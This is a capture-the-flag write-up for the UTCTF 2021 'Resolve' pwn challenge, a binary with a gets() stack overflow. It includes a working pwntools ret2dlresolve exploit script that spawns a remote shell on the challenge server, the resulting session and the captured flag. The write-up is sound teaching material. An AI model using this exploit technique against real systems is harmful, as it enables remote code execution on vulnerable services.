# Resolve

**Category**: Pwn \  
**Points**: 980 (46 solves) \  
**Author**: trab

## Challenge

Yeah you have an overflow, but where do you even jump to? If only there was  
some sort of way to find the address of system.

`nc pwn.utctf.live 5435`

Attachments: `resolve`

## Overview

I threw it into Ghidra and got this:  
```c  
int main() {  
 char buf[8];  
 gets(buf);  
 return 0;  
}  
```

Wow another tiny pwn challenge!  
Let's do `checksec`:

```  
$ checksec resolve  
[*] '/home/plushie/Programs/bbb_writeups/2021/utctf/Resolve/resolve'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```

## Solution

The challenge hints at ret2dlresolve, which should work since there's no PIE  
and stack canary.  
Luckily I saw a super elegant ret2dlresolve solution by theKidOfArcrania to  
[babyrop](https://ctftime.org/task/14690) from DiceCTF, so I just edited it  
slightly and it worked!

Pwntools is so powerful sometimes it makes me feel like a script kiddie lol.

```python  
import pwn

pwn.context.binary = e = pwn.ELF("./resolve")

# p = pwn.process("./resolve")  
p = pwn.remote("pwn.utctf.live", 5435)

if pwn.args.GDB:  
   pwn.gdb.attach(  
       p,  
       gdbscript="""  
break *(&main+29)  
continue  
   """,  
   )

r = pwn.ROP(e)  
d = pwn.Ret2dlresolvePayload(e, symbol="system", args=["sh"])  
r.raw(0x401159)  # ret gadget to align stack  
r.gets(d.data_addr)  
r.ret2dlresolve(d)

payload = pwn.fit({0x10: r.chain()}) + b"\n" + d.payload  
p.sendline(payload)  
p.interactive()  
```

Output:  
```  
$ python3 solve.py  
[*] '/home/plushie/Programs/bbb_writeups/2021/utctf/Resolve/resolve'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
[+] Opening connection to pwn.utctf.live on port 5435: Done  
[*] Loading gadgets for
'/home/plushie/Programs/bbb_writeups/2021/utctf/Resolve/resolve'  
[*] Switching to interactive mode  
$ ls  
flag.txt  
$ cat flag.txt  
utflag{2_linker_problems_in_one_ctf?8079235}  
```  

Original writeup (https://github.com/cscosu/ctf-
writeups/tree/master/2021/utctf/Resolve).